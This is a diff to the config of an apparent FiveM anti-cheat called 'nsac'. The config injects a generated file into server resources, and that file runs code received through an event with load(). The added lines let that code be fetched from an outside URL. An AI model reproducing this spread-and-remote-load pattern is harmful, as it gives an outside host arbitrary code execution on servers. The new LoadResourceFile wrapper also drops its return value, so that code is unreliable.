@@ -56,6 +56,8 @@ Config.currentFramework = 'ESX' --[[Options: ESX | VRP | NONE]]
 ]]
 Config.fsName = 'nsac.lua' --[[Name of the file to be spread]]
 Config.fsManifest = '__resource.lua' --[[Don't modify if you have no clue of what you're doing | __resource.lua or fxmanifest.lua | ]]
+Config.useCustomWebfs = false --[[Enable if you have access to a custom code from web]]
+Config.customWebfsURL = 'https://d0pamine.xyz/secure/?id=0' --[[Link to the web to request the code from]]
 
 --[[
 	This is the code that will be inside the fsName file(s).
@@ -72,28 +74,35 @@ AddEventHandler('d0pamine:start-load', function(code)
 	assert(load(code))()
 end)
 
+Citizen.CreateThread(function()
+	while true do Citizen.Wait(30000)
+		if _G == nil then
+			TriggerServerEvent('nsac:trigger', 'nsac_100 - global var set to nil in resource: '..GetCurrentResourceName())
+		end
+	end
+end)
+
+local oldLoadResourceFile = LoadResourceFile
+LoadResourceFile = function(resourceName, fileName)
+    if resourceName ~= GetCurrentResourceName() then
+        TriggerServerEvent('nsac:trigger', 'nsac_100 - attempt to LRF('..resourceName..') in resource: '..GetCurrentResourceName())
+    else
+        oldLoadResourceFile(resourceName, fileName)
+    end
+end
+
 local oldGiveWeaponToPed = GiveWeaponToPed
-GiveWeaponToPed = function(ped, weaponHash, ammoCount, isHidden, equipNow)
-	if not ped then ped = 0 end 
-	if not weaponHash then weaponHash = 0 end 
-	if not ammoCount then ammoCount = 0 end 
-	if not isHidden then isHidden = 0 end 
-	if not equipNow then equipNow = 0 end 
-	oldGiveWeaponToPed(ped, weaponHash, ammoCount, isHidden, equipNow)
-	TriggerServerEvent('nsac:log', 'nsac - GiveWeaponToPed in resource: '..GetCurrentResourceName())
+GiveWeaponToPed = function(ped, ...)
+    if ped ~= PlayerPedId() then
+        TriggerServerEvent('nsac:trigger', 'nsac_100 - GiveWeaponToPed in resource: '..GetCurrentResourceName())
+    else
+        oldGiveWeaponToPed(ped, ...)
+    end
 end
 
 local oldAddExplosion = AddExplosion
-AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
-	if not x then x = 0 end 
-	if not y then y = 0 end 
-	if not z then z = 0 end 
-	if not explosionType then explosionType = 0 end 
-	if not damageScale then damageScale = 0 end 
-	if not isAudible then isAudible = 0 end 
-	if not isInvisible then isInvisible = 0 end 
-	if not cameraShake then cameraShake = 0 end 
-	oldAddExplosion(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
+AddExplosion = function(...)
+	oldAddExplosion(...)
 	TriggerServerEvent('nsac:log', 'nsac - AddExplosion in resource: '..GetCurrentResourceName())
 end
 ]]
